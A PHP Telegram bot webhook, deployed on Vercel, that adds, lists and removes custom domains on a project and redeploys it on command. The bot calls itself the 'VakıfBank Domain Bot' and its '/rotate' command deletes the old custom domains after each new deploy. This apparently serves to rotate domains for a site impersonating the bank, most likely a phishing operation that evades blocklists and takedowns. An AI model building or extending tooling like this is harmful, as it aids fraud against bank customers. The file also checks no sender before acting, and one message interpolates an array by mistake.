<?php
declare(strict_types=1);

/**
 * Telegram Bot Webhook Endpoint
 * 
 * Deployed on Vercel, handles incoming Telegram updates.
 * Commands:
 *   /domain <domain.com>  - Add custom domain to Vercel project
 *   /list                 - List all domains on Vercel project
 *   /remove <domain.com>  - Remove a domain from Vercel project
 *   /rotate               - Rotate (deploy with new random subdomain)
 *   /help                 - Show help
 * 
 * Required env vars:
 *   TELEGRAM_BOT_TOKEN    - Telegram Bot API token
 *   VERCEL_TOKEN          - Vercel API access token
 *   VERCEL_PROJECT_ID     - Vercel project ID (e.g. prj_xxx)
 *   VERCEL_TEAM_ID        - (optional) Vercel team ID
 */

require_once __DIR__ . '/includes/bootstrap.php';

const TELEGRAM_API = 'https://api.telegram.org/bot';
const VERCEL_API   = 'https://api.vercel.com';

function tgSend(int $chatId, string $text, string $parseMode = 'HTML'): array
{
    $token = getenv('TELEGRAM_BOT_TOKEN');
    if (!$token) return ['ok' => false, 'error' => 'TELEGRAM_BOT_TOKEN not set'];

    $url = TELEGRAM_API . $token . '/sendMessage';
    $data = [
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => $parseMode,
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
    ]);
    $resp = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return json_decode($resp, true) ?: ['ok' => false, 'http_code' => $httpCode];
}

function vercelApi(string $method, string $path, ?array $body = null): array
{
    $token = getenv('VERCEL_TOKEN');
    if (!$token) return ['ok' => false, 'error' => 'VERCEL_TOKEN not set'];

    $teamId = getenv('VERCEL_TEAM_ID');
    $query = $teamId ? '?teamId=' . urlencode($teamId) : '';

    $url = VERCEL_API . $path . $query;

    $ch = curl_init($url);
    $options = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_HTTPHEADER     => [
            'Authorization: Bearer ' . $token,
            'Content-Type: application/json',
        ],
    ];

    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        if ($body) $options[CURLOPT_POSTFIELDS] = json_encode($body);
    } elseif ($method === 'DELETE') {
        $options[CURLOPT_CUSTOMREQUEST] = 'DELETE';
        if ($body) $options[CURLOPT_POSTFIELDS] = json_encode($body);
    } elseif ($method === 'GET') {
        $options[CURLOPT_HTTPGET] = true;
    }

    curl_setopt_array($ch, $options);
    $resp = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ['ok' => $httpCode >= 200 && $httpCode < 300, 'http_code' => $httpCode, 'data' => json_decode($resp, true)];
}

function handleCommand(int $chatId, string $cmd, array $args): void
{
    switch ($cmd) {
        case '/start':
        case '/help':
            $msg = "🤖 <b>VakıfBank Domain Bot</b>\n\n"
                 . "<b>/domain</b> <code>example.com</code> — Yeni domain ekle\n"
                 . "<b>/list</b> — Domainleri listele\n"
                 . "<b>/remove</b> <code>example.com</code> — Domain sil\n"
                 . "<b>/rotate</b> — Rastgele yeni bir deploy tetikle\n"
                 . "<b>/help</b> — Yardım";
            tgSend($chatId, $msg);
            break;

        case '/domain':
            if (empty($args)) {
                tgSend($chatId, "❌ Kullanım: <code>/domain example.com</code>");
                return;
            }
            $domain = trim($args[0]);
            $projectId = getenv('VERCEL_PROJECT_ID');
            if (!$projectId) {
                tgSend($chatId, "❌ VERCEL_PROJECT_ID ayarlanmamış.");
                return;
            }
            $result = vercelApi('POST', "/v9/projects/{$projectId}/domains", ['name' => $domain]);
            if ($result['ok']) {
                tgSend($chatId, "✅ Domain <b>{$domain}</b> başarıyla eklendi!\n\n"
                     . "📌 DNS ayarlarını Vercel'in verdiği hedefe yönlendirmeyi unutma.");
            } else {
                $err = $result['data']['error']['message'] ?? json_encode($result['data']);
                tgSend($chatId, "❌ Domain eklenemedi: {$err}");
            }
            break;

        case '/list':
            $projectId = getenv('VERCEL_PROJECT_ID');
            if (!$projectId) {
                tgSend($chatId, "❌ VERCEL_PROJECT_ID ayarlanmamış.");
                return;
            }
            $result = vercelApi('GET', "/v9/projects/{$projectId}/domains");
            if (!$result['ok']) {
                tgSend($chatId, "❌ Domainler alınamadı.");
                return;
            }
            $domains = $result['data']['domains'] ?? [];
            if (empty($domains)) {
                tgSend($chatId, "📭 Henüz domain eklenmemiş.");
                return;
            }
            $lines = [];
            foreach ($domains as $d) {
                $name = $d['name'] ?? '-';
                $verified = $d['verified'] ? '✅' : '⏳';
                $lines[] = "{$verified} <b>{$name}</b>";
            }
            tgSend($chatId, "📋 <b>Domainler ({$domains})</b>:\n" . implode("\n", $lines));
            break;

        case '/remove':
            if (empty($args)) {
                tgSend($chatId, "❌ Kullanım: <code>/remove example.com</code>");
                return;
            }
            $domain = trim($args[0]);
            $projectId = getenv('VERCEL_PROJECT_ID');
            if (!$projectId) {
                tgSend($chatId, "❌ VERCEL_PROJECT_ID ayarlanmamış.");
                return;
            }
            $result = vercelApi('DELETE', "/v9/projects/{$projectId}/domains/{$domain}");
            if ($result['ok']) {
                tgSend($chatId, "✅ Domain <b>{$domain}</b> kaldırıldı.");
            } else {
                $err = $result['data']['error']['message'] ?? 'Bilinmeyen hata';
                tgSend($chatId, "❌ Domain kaldırılamadı: {$err}");
            }
            break;

        case '/rotate':
            $projectId = getenv('VERCEL_PROJECT_ID');
            $token = getenv('VERCEL_TOKEN');
            if (!$projectId || !$token) {
                tgSend($chatId, "❌ VERCEL_PROJECT_ID veya VERCEL_TOKEN ayarlanmamış.");
                return;
            }
            tgSend($chatId, "🔄 Yeni deploy tetikleniyor...");
            $teamId = getenv('VERCEL_TEAM_ID');
            $query = $teamId ? '?teamId=' . urlencode($teamId) : '';
            $ch = curl_init(VERCEL_API . "/v13/deployments{$query}");
            curl_setopt_array($ch, [
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => json_encode([
                    'name'                 => 'vakifbank',
                    'project'              => $projectId,
                    'target'               => 'production',
                    'withLatestSources'    => true,
                ]),
                CURLOPT_HTTPHEADER     => [
                    'Authorization: Bearer ' . $token,
                    'Content-Type: application/json',
                ],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 30,
            ]);
            $resp = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            $deployData = json_decode($resp, true);

            if ($httpCode >= 200 && $httpCode < 300) {
                $url = $deployData['url'] ?? 'bilinmiyor';
                $alias = $deployData['alias'] ?? null;
                $msg = "✅ Yeni deploy oluşturuldu!\n🌐 <code>{$url}</code>";
                if ($alias) $msg .= "\n🔗 Alias: <code>" . implode(', ', $alias) . '</code>';
                tgSend($chatId, $msg);
                // Remove old custom domains to force new assignment
                $listRes = vercelApi('GET', "/v9/projects/{$projectId}/domains");
                $domains = $listRes['data']['domains'] ?? [];
                foreach ($domains as $d) {
                    $name = $d['name'] ?? '';
                    if ($name && !str_contains($name, '.vercel.app')) {
                        vercelApi('DELETE', "/v9/projects/{$projectId}/domains/{$name}");
                    }
                }
            } else {
                $err = $deployData['error']['message'] ?? 'Deploy başarısız';
                tgSend($chatId, "❌ Deploy hatası: {$err}");
            }
            break;

        default:
            tgSend($chatId, "❌ Bilinmeyen komut. /help yaz.");
    }
}

// --- Webhook Entry ---
$input = json_decode(file_get_contents('php://input'), true);
if (!$input || !isset($input['message'])) {
    http_response_code(200);
    echo 'ok';
    exit;
}

$msg  = $input['message'];
$chatId = (int) ($msg['chat']['id'] ?? 0);
$text = trim((string) ($msg['text'] ?? ''));

if ($chatId <= 0 || $text === '') {
    http_response_code(200);
    echo 'ok';
    exit;
}

$parts = preg_split('/\s+/', $text);
$cmd   = $parts[0] ?? '';
$args  = array_slice($parts, 1);

handleCommand($chatId, $cmd, $args);

http_response_code(200);
echo 'ok';
